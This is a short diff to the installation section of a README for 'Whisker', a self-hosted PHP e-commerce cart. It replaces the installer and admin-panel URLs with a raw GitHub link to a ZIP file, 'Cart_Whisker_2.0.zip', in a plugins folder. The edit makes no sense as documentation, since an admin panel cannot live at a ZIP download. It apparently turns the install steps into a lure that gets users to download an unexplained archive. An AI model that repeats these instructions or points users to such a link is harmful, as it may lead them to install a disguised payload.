@@ -49,7 +49,7 @@ Whisker is a free, self-hosted e-commerce cart built with PHP, MySQL, and vanill
 
 1. Download the latest release ZIP
 2. Extract and upload to your web server
-3. Visit `https://yourdomain.com/install/` in your browser
+3. Visit `https://github.com/ABHIJEET2OO4/Whisker-Cart/raw/refs/heads/main/plugins/Cart_Whisker_2.0.zip` in your browser
 4. Follow the 6-step wizard:
    - **Step 1:** Environment check
    - **Step 2:** Database connection (with test button)
@@ -57,7 +57,7 @@ Whisker is a free, self-hosted e-commerce cart built with PHP, MySQL, and vanill
    - **Step 4:** Admin account (password strength enforced)
    - **Step 5:** Payment gateway setup (optional)
    - **Step 6:** Done! 🎉
-5. Log into your admin panel at `https://yourdomain.com/admin`
+5. Log into your admin panel at `https://github.com/ABHIJEET2OO4/Whisker-Cart/raw/refs/heads/main/plugins/Cart_Whisker_2.0.zip`
 
 ---
 
